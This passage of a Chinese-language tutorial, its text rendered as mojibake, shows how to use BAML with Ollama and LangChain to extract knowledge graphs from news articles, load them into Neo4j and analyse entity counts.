<span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹æˆ–å…³ç³»çš„å¯é€‰å±æ€§ç»“æ„  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">Properties</span> {  
Â  description <span class="hljs-built_in">string</span>? Â  Â  Â  Â <span class="hljs-comment">// å¯é€‰çš„æ–‡æœ¬æè¿°  </span>
}  
  
<span class="hljs-comment">// å®šä¹‰ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">SimpleRelationship</span> {  
Â  source_node_id <span class="hljs-built_in">string</span> Â  Â  Â <span class="hljs-comment">// æºèŠ‚ç‚¹çš„ID  </span>
Â  source_node_type <span class="hljs-built_in">string</span> Â  Â <span class="hljs-comment">// æºèŠ‚ç‚¹çš„ç±»å‹  </span>
Â  target_node_id <span class="hljs-built_in">string</span> Â  Â  Â <span class="hljs-comment">// ç›®æ ‡èŠ‚ç‚¹çš„ID  </span>
Â  target_node_type <span class="hljs-built_in">string</span> Â  Â <span class="hljs-comment">// ç›®æ ‡èŠ‚ç‚¹çš„ç±»å‹  </span>
Â  type <span class="hljs-built_in">string</span> Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment">// å…³ç³»ç±»å‹ï¼ˆä¾‹å¦‚ï¼Œ"connects_to", "belongs_to"ï¼‰  </span>
Â  properties Properties Â  Â  Â <span class="hljs-comment">// å…³ç³»çš„é™„åŠ å±æ€§  </span>
}  
  
<span class="hljs-comment">// å®šä¹‰åŒ…å«èŠ‚ç‚¹å’Œå…³ç³»çš„æ•´ä½“å›¾è°±  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title">DynamicGraph</span> {  
Â  nodes SimpleNode[] Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// å›¾è°±ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹åˆ—è¡¨  </span>
Â  relationships SimpleRelationship[] <span class="hljs-comment">// èŠ‚ç‚¹ä¹‹é—´çš„æ‰€æœ‰å…³ç³»åˆ—è¡¨  </span>
}  
  
<span class="hljs-comment">// ä»åŸå§‹è¾“å…¥å­—ç¬¦ä¸²æå–DynamicGraphçš„å‡½æ•°  </span>
<span class="hljs-function">function <span class="hljs-title">ExtractGraph</span>(<span class="hljs-params">graph: <span class="hljs-built_in">string</span></span>) -&gt; DynamicGraph</span> {  
Â  client Ollama Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ä½¿ç”¨Ollamaå®¢æˆ·ç«¯è§£é‡Šè¾“å…¥  </span>
Â  prompt <span class="hljs-meta">#"  </span>
Â  Â  Extract <span class="hljs-keyword">from</span> <span class="hljs-keyword">this</span> content:  
Â  Â  {{ ctx.output_format }}  
  
Â  Â  {{ graph }} Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æç¤ºæ¨¡æ¿ï¼ŒæŒ‡å¯¼Ollamaæå–å›¾è°±  </span>
}
</code></pre>
<p>ç±»å®šä¹‰ç®€å•æ˜“è¯»ã€‚<code>ExtractGraph</code>å‡½æ•°å‘Šè¯‰BAMLä½¿ç”¨Ollamaå®¢æˆ·ç«¯ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªJinjaæç¤ºæ¨¡æ¿ã€‚ç‰¹æ®Šçš„<code>{{ ctx.output_format }}</code>å˜é‡æ˜¯BAMLè‡ªåŠ¨æ³¨å…¥æˆ‘ä»¬ç®€åŒ–schemaå®šä¹‰çš„åœ°æ–¹ã€‚</p>
<hr/>
<h2 data-id="heading-13">å°†BAMLä¸LangChainé›†æˆ</h2>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªBAMLå‡½æ•°é›†æˆåˆ°LangChainå·¥ä½œæµç¨‹ä¸­ã€‚æˆ‘ä»¬éœ€è¦ä¸€äº›è¾…åŠ©å‡½æ•°ï¼Œå°†BAMLçš„è¾“å‡ºè½¬æ¢ä¸ºLangChainå’ŒNeo4jç†è§£çš„GraphDocumentæ ¼å¼ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¼å…¥å¿…è¦çš„åº“  </span>
<span class="hljs-keyword">from</span>Â typingÂ importAny,Â <span class="hljs-type">List</span>  
<span class="hljs-keyword">import</span>Â baml_clientÂ <span class="hljs-keyword">as</span>Â client  
<span class="hljs-keyword">from</span>Â langchain_community.graphs.graph_documentÂ <span class="hljs-keyword">import</span>Â GraphDocument, Node, Relationship  
<span class="hljs-keyword">from</span>Â langchain_core.runnablesÂ <span class="hljs-keyword">import</span>Â chain  
  
<span class="hljs-comment"># è¾…åŠ©å‡½æ•°ï¼Œæ­£ç¡®æ ¼å¼åŒ–èŠ‚ç‚¹ï¼ˆä¾‹å¦‚ï¼Œé€‚å½“å¤§å†™ï¼‰  </span>
def_format_nodes(nodes:Â <span class="hljs-type">List</span>[Node]) -&gt;Â <span class="hljs-type">List</span>[Node]:  
Â  Â Â <span class="hljs-keyword">return</span>Â [  
Â  Â  Â  Â  Node(  
Â  Â  Â  Â  Â  Â Â <span class="hljs-built_in">id</span>=el.<span class="hljs-built_in">id</span>.title()Â ifisinstance(el.<span class="hljs-built_in">id</span>,Â <span class="hljs-built_in">str</span>)Â <span class="hljs-keyword">else</span>Â el.<span class="hljs-built_in">id</span>,  
Â  Â  Â  Â  Â  Â Â <span class="hljs-built_in">type</span>=el.<span class="hljs-built_in">type</span>.capitalize()Â <span class="hljs-keyword">if</span>Â el.typeelseNone,  
Â  Â  Â  Â  Â  Â  properties=el.properties  
Â  Â  Â  Â  )  
Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â elÂ <span class="hljs-keyword">in</span>Â nodes  
Â  Â  ]  
  
<span class="hljs-comment"># è¾…åŠ©å‡½æ•°ï¼Œå°†BAMLçš„å…³ç³»è¾“å‡ºæ˜ å°„åˆ°LangChainçš„Relationshipå¯¹è±¡  </span>
defmap_to_base_relationship(rel:Â <span class="hljs-type">Any</span>) -&gt; Relationship:  
Â  Â  source = Node(<span class="hljs-built_in">id</span>=rel.source_node_id,Â <span class="hljs-built_in">type</span>=rel.source_node_type)  
Â  Â  target = Node(<span class="hljs-built_in">id</span>=rel.target_node_id,Â <span class="hljs-built_in">type</span>=rel.target_node_type)  
Â  Â Â <span class="hljs-keyword">return</span>Â Relationship(  
Â  Â  Â  Â  source=source, target=target,Â <span class="hljs-built_in">type</span>=rel.<span class="hljs-built_in">type</span>, properties=rel.properties  
Â  Â  )  
  
<span class="hljs-comment"># ä¸»è¦è¾…åŠ©å‡½æ•°ï¼Œæ ¼å¼åŒ–æ‰€æœ‰å…³ç³»  </span>
def_format_relationships(rels) -&gt;Â <span class="hljs-type">List</span>[Relationship]:  
Â  Â  relationships = [  
Â  Â  Â  Â  map_to_base_relationship(rel)  
Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â relÂ <span class="hljs-keyword">in</span>Â rels  
Â  Â  Â  Â Â <span class="hljs-keyword">if</span>Â rel.typeandÂ rel.source_node_idÂ <span class="hljs-keyword">and</span>Â rel.target_node_id  
Â  Â  ]  
Â  Â Â <span class="hljs-keyword">return</span>Â [  
Â  Â  Â  Â  Relationship(  
Â  Â  Â  Â  Â  Â  source=_format_nodes([el.source])[<span class="hljs-number">0</span>],  
Â  Â  Â  Â  Â  Â  target=_format_nodes([el.target])[<span class="hljs-number">0</span>],  
Â  Â  Â  Â  Â  Â Â <span class="hljs-built_in">type</span>=el.<span class="hljs-built_in">type</span>.replace(<span class="hljs-string">" "</span>,Â <span class="hljs-string">"_"</span>).upper(),  
Â  Â  Â  Â  Â  Â  properties=el.properties,  
Â  Â  Â  Â  )  
Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â elÂ <span class="hljs-keyword">in</span>Â relationships  
Â  Â  ]  
  
<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªLangChainå¯é“¾å¼è°ƒç”¨çš„å‡½æ•°ï¼Œè°ƒç”¨æˆ‘ä»¬çš„BAMLå‡½æ•°  </span>
<span class="hljs-meta">@chain  </span>
asyncdefget_graph(message):  
Â  Â  graph =Â <span class="hljs-keyword">await</span>Â client.b.ExtractGraph(graph=message.content)  
Â  Â Â <span class="hljs-keyword">return</span>Â graph
</code></pre>
<p>è®©æˆ‘ä»¬äº†è§£æ¯ä¸ªè¾…åŠ©å‡½æ•°çš„ç›®çš„ï¼š</p>
<ul>
<li>â€¢Â <code>_format_nodes(nodes)</code>ï¼šé€šè¿‡å¤§å†™IDå’Œç±»å‹æ¥æ ‡å‡†åŒ–èŠ‚ç‚¹æ ¼å¼ï¼Œè¿”å›æ ¼å¼æ•´æ´çš„Nodeå¯¹è±¡åˆ—è¡¨ã€‚</li>
<li>â€¢Â <code>map_to_base_relationship(rel)</code>ï¼šå°†åŸå§‹BAMLå…³ç³»è½¬æ¢ä¸ºåŸºæœ¬çš„LangChain Relationshipå¯¹è±¡ï¼Œå°†æºå’Œç›®æ ‡åŒ…è£…ä¸ºNodeå¯¹è±¡ã€‚</li>
<li>â€¢Â <code>_format_relationships(rels)</code>ï¼šè¿‡æ»¤æ— æ•ˆå…³ç³»ï¼Œå°†å…¶æ˜ å°„åˆ°LangChain Relationshipå¯¹è±¡ï¼Œå¹¶æ ¼å¼åŒ–èŠ‚ç‚¹ç±»å‹å’Œå…³ç³»ç±»å‹ä»¥ä¿æŒä¸€è‡´æ€§ã€‚</li>
<li>â€¢Â <code>get_graph(message)</code>ï¼šä¸€ä¸ªå¼‚æ­¥é“¾å‡½æ•°ï¼Œå°†è¾“å…¥æ¶ˆæ¯å‘é€åˆ°BAML APIï¼Œè°ƒç”¨ExtractGraphï¼Œå¹¶è¿”å›åŸå§‹å›¾è°±è¾“å‡ºã€‚</li>
</ul>
<p>æœ‰äº†è¿™äº›è¾…åŠ©å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰æ–°çš„å¤„ç†é“¾ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªæ›´ç®€å•çš„è‡ªå®šä¹‰æç¤ºï¼Œå› ä¸ºBAMLä¸ºæˆ‘ä»¬å¤„ç†äº†å¤æ‚çš„schemaæ³¨å…¥ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥æç¤ºæ¨¡æ¿  </span>
fromÂ langchain_core.promptsÂ importÂ ChatPromptTemplate  
  
<span class="hljs-comment"># ä¸€ä¸ªç®€å•æœ‰æ•ˆçš„ç³»ç»Ÿæç¤º  </span>
<span class="hljs-attr">system_prompt</span> =Â <span class="hljs-string">"""  
ä½ æ˜¯ä¸€ä¸ªçŸ¥è¯†æ¸Šåšçš„åŠ©æ‰‹ï¼Œæ“…é•¿ä»æ–‡æœ¬ä¸­æå–å®ä½“åŠå…¶å…³ç³»ã€‚  
ä½ çš„ç›®æ ‡æ˜¯åˆ›å»ºçŸ¥è¯†å›¾è°±ã€‚  
"""</span>  
  
<span class="hljs-comment"># æœ€ç»ˆæç¤ºæ¨¡æ¿  </span>
<span class="hljs-attr">default_prompt</span> = ChatPromptTemplate.from_messages(  
Â  Â  <span class="hljs-section">[  
Â  Â  Â  Â  ("system", system_prompt),  
Â  Â  Â  Â  (  
Â  Â  Â  Â  Â  Â Â "human",  
Â  Â  Â  Â  Â  Â  (  
Â  Â  Â  Â  Â  Â  Â  Â Â "æç¤ºï¼šç¡®ä¿ä»¥æ­£ç¡®æ ¼å¼å›ç­”ï¼Œä¸è¦åŒ…å«ä»»ä½•è§£é‡Šã€‚ "  
Â  Â  Â  Â  Â  Â  Â  Â Â "ä½¿ç”¨ç»™å®šæ ¼å¼ä»ä»¥ä¸‹è¾“å…¥ä¸­æå–ä¿¡æ¯ï¼š{input}"  
Â  Â  Â  Â  Â  Â  ),  
Â  Â  Â  Â  ),  
Â  Â  ]</span>  
)  
  
<span class="hljs-comment"># å®šä¹‰å®Œæ•´çš„BAMLé©±åŠ¨é“¾  </span>
<span class="hljs-attr">chain</span> = default_prompt | llm | get_graph
</code></pre>
<p>è¿™ä¸ªæç¤ºæ¨¡æ¿æŒ‡å¯¼æ¨¡å‹æå–å®ä½“å’Œå…³ç³»ä»¥æ„å»ºçŸ¥è¯†å›¾è°±ï¼š</p>
<ul>
<li>â€¢Â <code>system_prompt</code>ï¼šå°†æ¨¡å‹è§’è‰²è®¾ç½®ä¸ºå®ä½“-å…³ç³»æå–å™¨ã€‚</li>
<li>â€¢Â <code>default_prompt</code>ï¼šç»“åˆç³»ç»Ÿå’Œäººç±»æ¶ˆæ¯ï¼Œå¸¦æœ‰è¾“å…¥æ–‡æœ¬çš„å ä½ç¬¦ã€‚</li>
<li>â€¢Â <code>chain</code>ï¼šé€šè¿‡è¯­è¨€æ¨¡å‹è¿è¡Œæç¤ºï¼Œç„¶åå°†è¾“å‡ºä¼ é€’ç»™get_graphè¿›è¡Œå›¾è°±æå–ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-14">è¿è¡ŒBAMLå®éªŒ</h2>
<p>ç°åœ¨æ˜¯å†æ¬¡è¿è¡Œå®éªŒçš„æ—¶å€™äº†ã€‚è¿™æ¬¡æˆ‘ä»¬å°†å¤„ç†æ›´å¤§çš„æ–‡ç« æ‰¹æ¬¡ï¼Œä»¥çœŸæ­£æµ‹è¯•æ–°æ–¹æ³•çš„å¯é æ€§ã€‚</p>
<p>ç”±äºæ—¶é—´é™åˆ¶ï¼Œæˆ‘åœ¨å¤„ç†344ç¯‡æ–‡ç« ååœæ­¢äº†æ‰§è¡Œï¼Œä½†è¿™æ¯”æœ€åˆçš„20ç¯‡æ ·æœ¬è¦ç¨³å¥å¾—å¤šã€‚</p>
<p>åœ¨æ‰§è¡Œå¹¶è¡Œå¤„ç†ä¹‹å‰ï¼Œéœ€è¦ä¸€äº›è¾…åŠ©å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆæ¥å†™è¿™äº›å‡½æ•°ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">importÂ asyncio  
  
<span class="hljs-comment"># å¼‚æ­¥å‡½æ•°ï¼Œå¤„ç†å•ä¸ªæ–‡æ¡£  </span>
asyncdefaprocess_response(document: Document) -&gt; GraphDocument:  
Â  Â Â <span class="hljs-comment"># è°ƒç”¨æˆ‘ä»¬çš„BAMLé“¾  </span>
Â  Â  <span class="hljs-attr">resp</span> =Â awaitÂ chain.ainvoke({<span class="hljs-string">"input"</span>: document.page_content})  
Â  Â Â <span class="hljs-comment"># å°†å“åº”æ ¼å¼åŒ–ä¸ºGraphDocument  </span>
Â  Â Â returnÂ GraphDocument(  
Â  Â  Â  Â  <span class="hljs-attr">nodes</span>=_format_nodes(resp.nodes),  
Â  Â  Â  Â  <span class="hljs-attr">relationships</span>=_format_relationships(resp.relationships),  
Â  Â  Â  Â  <span class="hljs-attr">source</span>=document,  
Â  Â  )  
  
<span class="hljs-comment"># å¼‚æ­¥å‡½æ•°ï¼Œå¤„ç†æ–‡æ¡£åˆ—è¡¨  </span>
asyncdefaconvert_to_graph_documents(  
Â  Â  documents:Â List<span class="hljs-section">[Document]</span>,  
) -&gt;Â List<span class="hljs-section">[GraphDocument]</span>:  
Â  Â  <span class="hljs-attr">tasks</span> = [asyncio.create_task(aprocess_response(document))Â forÂ documentÂ inÂ documents]  
Â  Â  <span class="hljs-attr">results</span> =Â awaitÂ asyncio.gather(*tasks)  
Â  Â Â returnÂ results  
  
<span class="hljs-comment"># å¼‚æ­¥å‡½æ•°ï¼Œå¤„ç†åŸå§‹æ–‡æœ¬  </span>
asyncdefaprocess_text(texts:Â List<span class="hljs-section">[str]</span>) -&gt;Â List<span class="hljs-section">[GraphDocument]</span>:  
Â  Â  <span class="hljs-attr">docs</span> = [Document(page_content=text)Â forÂ textÂ inÂ texts]  
Â  Â  <span class="hljs-attr">graph_docs</span> =Â awaitÂ aconvert_to_graph_documents(docs)  
Â  Â Â returnÂ graph_docs
</code></pre>
<p>è®©æˆ‘ä»¬åˆ†è§£æ¯ä¸ªå¼‚æ­¥å‡½æ•°çš„ç›®çš„ï¼š</p>
<ul>
<li>â€¢Â <code>aprocess_response</code>ï¼šå¤„ç†ä¸€ä¸ªæ–‡æ¡£å¹¶è¿”å›GraphDocumentã€‚</li>
<li>â€¢Â <code>aconvert_to_graph_documents</code>ï¼šå¹¶è¡Œå¤„ç†å¤šä¸ªæ–‡æ¡£å¹¶è¿”å›å›¾è°±ç»“æœã€‚</li>
<li>â€¢Â <code>aprocess_text</code>ï¼šå°†åŸå§‹æ–‡æœ¬è½¬æ¢ä¸ºæ–‡æ¡£å¹¶æå–å›¾è°±æ•°æ®ã€‚</li>
</ul>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°æ‰§è¡Œä¸»å¾ªç¯æ¥å¤„ç†æ–‡ç« ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºåˆ—è¡¨ï¼Œå­˜å‚¨ç”Ÿæˆçš„å›¾è°±æ–‡æ¡£  </span>
<span class="hljs-attr">graph_documents_baml</span> = []  
  
<span class="hljs-comment"># è®¾ç½®è¦å¤„ç†çš„æ–‡ç« æ€»æ•°  </span>
<span class="hljs-attr">NUM_ARTICLES_BAML</span> =Â <span class="hljs-number">344</span>  
  
<span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªä»…åŒ…å«è¦å¤„ç†çš„æ–‡ç« çš„è¾ƒå°DataFrame  </span>
<span class="hljs-attr">news_baml</span> = news.head(NUM_ARTICLES_BAML)  
  
<span class="hljs-comment"># ä»æ–°DataFrameä¸­æå–æ ‡é¢˜å’Œæ–‡æœ¬  </span>
<span class="hljs-attr">titles</span> = news_baml[<span class="hljs-string">"title"</span>]  
<span class="hljs-attr">texts</span> = news_baml[<span class="hljs-string">"text"</span>]  
  
<span class="hljs-comment"># å®šä¹‰æ¯æ‰¹ï¼ˆchunkï¼‰å¤„ç†çš„æ–‡ç« æ•°é‡  </span>
<span class="hljs-attr">chunk_size</span> =Â <span class="hljs-number">4</span>  
  
<span class="hljs-comment"># ä½¿ç”¨tqdmæ˜¾ç¤ºè¿›åº¦æ¡ï¼Œé€æ‰¹è¿­ä»£æ–‡ç«   </span>
forÂ iÂ inÂ tqdm(range(0,Â len(titles), chunk_size), <span class="hljs-attr">desc</span>=<span class="hljs-string">"ä½¿ç”¨BAMLå¤„ç†åˆ†å—"</span>):  
Â  Â Â <span class="hljs-comment"># è·å–å½“å‰åˆ†å—çš„æ ‡é¢˜  </span>
Â  Â  <span class="hljs-attr">title_chunk</span> = titles[i : i + chunk_size]  
Â  Â Â <span class="hljs-comment"># è·å–å½“å‰åˆ†å—çš„æ–‡æœ¬  </span>
Â  Â  <span class="hljs-attr">text_chunk</span> = texts[i : i + chunk_size]  
Â  Â Â   
Â  Â Â <span class="hljs-comment"># å°†æ¯ç¯‡æ–‡ç« çš„æ ‡é¢˜å’Œæ–‡æœ¬åˆå¹¶ä¸ºå•ä¸ªå­—ç¬¦ä¸²  </span>
Â  Â  <span class="hljs-attr">combined_docs</span> = [f<span class="hljs-string">"{title}Â {text}"</span>forÂ title, textÂ inzip(title_chunk, text_chunk)]  
Â  Â Â   
Â  Â Â try:  
Â  Â  Â  Â Â <span class="hljs-comment"># å¼‚æ­¥å¤„ç†åˆå¹¶çš„æ–‡æ¡£ä»¥æå–å›¾è°±ç»“æ„  </span>
Â  Â  Â  Â  <span class="hljs-attr">docs</span> =Â awaitÂ aprocess_text(combined_docs)  
Â  Â  Â  Â Â <span class="hljs-comment"># å°†å¤„ç†å¥½çš„å›¾è°±æ–‡æ¡£æ·»åŠ åˆ°ä¸»åˆ—è¡¨  </span>
Â  Â  Â  Â  graph_documents_baml.extend(docs)  
Â  Â Â exceptÂ ExceptionÂ asÂ e:  
Â  Â  Â  Â Â <span class="hljs-comment"># å¤„ç†å¤„ç†è¿‡ç¨‹ä¸­å‘ç”Ÿçš„ä»»ä½•é”™è¯¯å¹¶æ‰“å°é”™è¯¯æ¶ˆæ¯  </span>
Â  Â  Â  Â Â print(f"å¤„ç†ä»ç´¢å¼•{i}å¼€å§‹çš„åˆ†å—æ—¶å‡ºé”™ï¼š{e}")  
  
<span class="hljs-comment"># å¾ªç¯ç»“æŸåï¼Œæ˜¾ç¤ºæˆåŠŸå¤„ç†çš„å›¾è°±æ–‡æ¡£æ€»æ•°  </span>
len(graph_documents_baml)
</code></pre>
<p>è¿™æ˜¯æˆ‘ä»¬å¾—åˆ°çš„è¾“å‡ºã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å›¾è°±æ–‡æ¡£æ€»æ•°344</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ff4633b5ca74a788b8dc98c11f79662~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=kKSDJfKg0OIf2j5wh8XJbZKTcVo%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬å¤„ç†äº†344ç¯‡æ–‡ç« ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿è¡Œä¹‹å‰åšçš„å¤±è´¥åˆ†æã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºç»Ÿè®¡æ²¡æœ‰èŠ‚ç‚¹çš„æ–‡æ¡£  </span>
empty_count_baml =Â <span class="hljs-number">0</span>  
  
<span class="hljs-comment"># éå†BAMLæ–¹æ³•çš„å¤„ç†ç»“æœ  </span>
<span class="hljs-keyword">for</span>Â docÂ <span class="hljs-keyword">in</span>Â graph_documents_baml:  
Â  Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-keyword">not</span>Â doc.nodes:  
Â  Â  Â  Â  empty_count_baml +=Â <span class="hljs-number">1</span>  
  
<span class="hljs-comment"># è®¡ç®—å¹¶æ‰“å°æ–°çš„å¤±è´¥ç™¾åˆ†æ¯”  </span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Percentage missing with BAML:Â <span class="hljs-subst">{empty_count_baml /Â <span class="hljs-built_in">len</span>(graph_documents_baml) *Â <span class="hljs-number">100</span>}</span>%"</span>)
</code></pre>
<h4 data-id="heading-15">è¾“å‡º</h4>
<pre><code class="hljs language-csharp" lang="csharp">Percentage missing <span class="hljs-keyword">with</span> BAML: <span class="hljs-number">0.5813953488372093</span>%
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ªæƒŠäººçš„ç»“æœã€‚æˆ‘ä»¬çš„å¤±è´¥ç‡ä»75%ä¸‹é™åˆ°ä»…0.58%ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬çš„æˆåŠŸç‡ç°åœ¨æ˜¯99.4%ï¼</p>
<p>é€šè¿‡ç®€å•åœ°å°†ä¸¥æ ¼çš„LLMGraphTransformeræ›¿æ¢ä¸ºBAMLé©±åŠ¨çš„é“¾ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªå¤±è´¥çš„åŸå‹è½¬å˜ä¸ºä¸€ä¸ªç¨³å¥çš„ç”Ÿäº§å°±ç»ªæµç¨‹ã€‚</p>
<p>è¿™è¡¨æ˜ç“¶é¢ˆä¸æ˜¯å°å‹LLMç†è§£ä»»åŠ¡çš„èƒ½åŠ›ï¼Œè€Œæ˜¯ç³»ç»Ÿå¯¹å®Œç¾JSONçš„è„†å¼±æœŸæœ›ã€‚</p>
<hr/>
<h2 data-id="heading-16">ä½¿ç”¨Neo4jåˆ†æGraphRAG</h2>
<p>ä»…ä»…æå–å®ä½“æ˜¯ä¸å¤Ÿçš„ã€‚GraphRAGçš„çœŸæ­£åŠ›é‡åœ¨äºç»“æ„åŒ–è¿™äº›çŸ¥è¯†ï¼Œæ‰¾åˆ°éšè—çš„è”ç³»ï¼Œå¹¶æ€»ç»“ç›¸å…³ä¿¡æ¯çš„ç¤¾åŒºã€‚</p>
<p>æˆ‘ä»¬ç°åœ¨å°†é«˜è´¨é‡çš„å›¾è°±æ•°æ®åŠ è½½åˆ°Neo4jä¸­ï¼Œå¹¶ä½¿ç”¨å›¾æ•°æ®ç§‘å­¦æŠ€æœ¯æ¥ä¸°å¯Œå®ƒã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è®¾ç½®ä¸Neo4jæ•°æ®åº“çš„è¿æ¥ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span>Â os  
<span class="hljs-keyword">from</span>Â langchain_community.graphsÂ <span class="hljs-keyword">import</span>Â Neo4jGraph  
  
<span class="hljs-comment"># ä½¿ç”¨ç¯å¢ƒå˜é‡è®¾ç½®Neo4jè¿æ¥è¯¦æƒ…  </span>
os.environ[<span class="hljs-string">"NEO4J_URI"</span>] =Â <span class="hljs-string">"bolt://localhost:7687"</span>  
os.environ[<span class="hljs-string">"NEO4J_USERNAME"</span>] =Â <span class="hljs-string">"neo4j"</span>  
os.environ[<span class="hljs-string">"NEO4J_PASSWORD"</span>] =Â <span class="hljs-string">"your_password"</span>Â <span class="hljs-comment"># å°†æ­¤æ›´æ”¹ä¸ºä½ çš„å¯†ç   </span>
os.environ[<span class="hljs-string">"DATABASE"</span>] =Â <span class="hljs-string">"graphragdemo"</span>  
  
<span class="hljs-comment"># åˆå§‹åŒ–Neo4jGraphå¯¹è±¡  </span>
graph = Neo4jGraph()
</code></pre>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†graph_documents_bamlæ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚<code>baseEntityLabel=True</code>å‚æ•°ä¸ºæ‰€æœ‰èŠ‚ç‚¹æ·»åŠ <code>__Entity__</code>æ ‡ç­¾ï¼Œä¾¿äºåç»­æŸ¥è¯¢ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å°†å›¾è°±æ–‡æ¡£æ·»åŠ åˆ°Neo4j  </span>
graph.add_graph_documents(graph_documents_baml, <span class="hljs-attr">baseEntityLabel</span>=<span class="hljs-literal">True</span>, include_source=<span class="hljs-literal">True</span>)
</code></pre>
<p>æ•°æ®åŠ è½½åï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€äº›CypheræŸ¥è¯¢æ¥äº†è§£æ–°çŸ¥è¯†å›¾è°±çš„ç»“æ„ã€‚è®©æˆ‘ä»¬ä»æŸ¥çœ‹æ–‡ç« é•¿åº¦ï¼ˆä»¥tokenè®¡ï¼‰å’Œä»ä¸­æå–çš„å®ä½“æ•°é‡ä¹‹é—´çš„å…³ç³»å¼€å§‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¼å…¥ç»˜å›¾å’Œæ•°æ®åˆ†æçš„åº“  </span>
<span class="hljs-keyword">import</span>Â matplotlib.pyplotÂ <span class="hljs-keyword">as</span>Â plt  
<span class="hljs-keyword">import</span>Â seabornÂ <span class="hljs-keyword">as</span>Â sns  
  
<span class="hljs-comment"># æŸ¥è¯¢Neo4jä»¥è·å–æ¯ä¸ªæ–‡æ¡£çš„å®ä½“æ•°é‡å’Œtokenæ•°é‡  </span>
entity_dist = graph.query(  
Â  Â Â <span class="hljs-string">"""  
Â  Â  MATCH (d:Document)  
Â  Â  RETURN d.text AS text,  
Â  Â  Â  Â  Â  Â count {(d)-[:MENTIONS]-&gt;()} AS entity_count  
Â  Â  """</span>  
)  
entity_dist_df = pd.DataFrame.from_records(entity_dist)  
entity_dist_df[<span class="hljs-string">"token_count"</span>] = [  
Â  Â  num_tokens_from_string(<span class="hljs-built_in">str</span>(el))Â <span class="hljs-keyword">for</span>Â elÂ <span class="hljs-keyword">in</span>Â entity_dist_df[<span class="hljs-string">"text"</span>]  
]  
  
<span class="hljs-comment"># åˆ›å»ºå¸¦å›å½’çº¿çš„æ•£ç‚¹å›¾  </span>
sns.lmplot(  
Â  Â  x=<span class="hljs-string">"token_count"</span>, y=<span class="hljs-string">"entity_count"</span>, data=entity_dist_df, line_kws={<span class="hljs-string">"color"</span>:Â <span class="hljs-string">"red"</span>}  
)  
plt.title(<span class="hljs-string">"å®ä½“æ•°é‡ä¸Tokenæ•°é‡åˆ†å¸ƒ"</span>)  
plt.xlabel(<span class="hljs-string">"Tokenæ•°é‡"</span>)  
plt.ylabel(<span class="hljs-string">"å®ä½“æ•°é‡"</span>)  
plt.show()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a053bec124964a158da6b89a53df3454~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=PEaR5yQzsb5QsU4LSUpfS93WoIc%3D" alt="" loading="lazy"/></p>
<p><strong>å®ä½“æ•°é‡ä¸Tokenæ•°é‡</strong></p>
